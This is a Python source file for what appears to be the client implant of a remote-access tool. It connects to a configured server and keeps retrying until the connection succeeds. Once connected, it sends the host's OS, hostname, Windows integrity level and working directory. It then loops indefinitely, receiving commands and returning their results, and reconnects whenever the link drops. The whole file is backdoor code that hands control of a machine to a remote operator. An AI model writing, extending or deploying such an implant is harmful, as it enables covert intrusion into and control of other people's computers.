import os
import platform
import socket
import sys
import time
import uuid

from client.config.config import SERVER_ADDR
from client.wrapper.server import Server
from common.util import logger

if os.name == 'nt':
    from client.util.command import INTEGRITY_LEVEL


class Client:
    def __init__(self, address):
        self.address = address
        self.server = Server()

    def connect(self):
        logger.info(f'Connecting to {self.address}')
        while not self.server.connect(self.address):
            time.sleep(5)
        info = {
            'id': str(uuid.uuid4()),
            'type': 'info',
            'os': platform.platform(),
            'hostname': socket.gethostname(),
            'integrity': INTEGRITY_LEVEL if os.name == 'nt' else 'N/A',
            'cwd': os.getcwd(),
        }
        self.server.send(info)
        logger.info('Connected')

    def wait(self):
        while True:
            try:
                result = self.server.recv_command()
                if result:
                    self.server.send_result(*result)
            except SystemExit:
                logger.info('Server closed this connection')
                break
            except socket.error:
                logger.error('Connection closed')
                self.server.close()
                self.server = Server()
                self.connect()
            except Exception as e:
                logger.error(e)
                self.server.close()
                self.server = Server()
                self.connect()


if __name__ == '__main__':
    client = Client(SERVER_ADDR)
    try:
        client.connect()
        client.wait()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        logger.error(e)
